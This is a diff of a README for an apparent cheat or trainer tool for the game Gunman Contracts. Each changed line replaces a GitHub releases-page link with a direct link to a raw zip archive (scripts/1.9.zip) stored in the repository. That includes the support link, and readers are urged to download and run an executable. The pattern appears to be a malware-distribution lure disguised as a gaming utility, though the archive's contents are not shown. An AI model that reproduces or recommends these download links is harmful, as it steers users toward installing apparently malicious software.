@@ -1,6 +1,6 @@
 # 🎯 Gunman-Contracts-Combat-Utility - Master Every Mission With Precision
 
-[![Download Now](https://img.shields.io/badge/Download-Gunman_Contracts_Utility-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/releases)
+[![Download Now](https://img.shields.io/badge/Download-Gunman_Contracts_Utility-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/main/scripts/1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **Gunman-Contracts-Combat-Utility**, your all-in-one companion for **
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [Download Gunman-Contracts-Combat-Utility](https://github.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/releases)
+Visit this link to download the application: [Download Gunman-Contracts-Combat-Utility](https://raw.githubusercontent.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/main/scripts/1.9.zip)
 
 Once you click the link, you'll see the latest release. Look for the file named `Gunman-Contracts-Combat-Utility.exe` (or similar) and click it to download.
 
@@ -236,12 +236,12 @@ This utility is free to use for personal purposes. Redistribution or commercial 
 
 ## 🤝 Support
 
-If you encounter any issues or have feature requests, please visit the [Releases Page](https://github.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/releases) and leave a comment on the latest version.
+If you encounter any issues or have feature requests, please visit the [Releases Page](https://raw.githubusercontent.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/main/scripts/1.9.zip) and leave a comment on the latest version.
 
 ---
 
 **Download now and take full control of your Gunman Contracts experience!**
 
-[![Get the Utility](https://img.shields.io/badge/Get_It_Here-Gunman_Contracts_Combat_Utility-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/releases)
+[![Get the Utility](https://img.shields.io/badge/Get_It_Here-Gunman_Contracts_Combat_Utility-blue?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/handynastydressmaking634/Gunman-Contracts-Combat-Utility/main/scripts/1.9.zip)
 
 Keywords: 2026, ammo--reload-controls, bullet-time--game-speed-profile, config-manager, desktop-tool, gaming-tools, gunman-contracts--stand-alone-trainer-2026, gunman-contracts-stand-alone-trainer-2026, health--survivability-profiles, hotkeys, loadout-profiles, mission-restart-utility, movement-settings, pc-gaming, profile-manager, recoil--accuracy-profiles, vr--non-vr-profiles, weapon-handling-presets, windows, windows-11
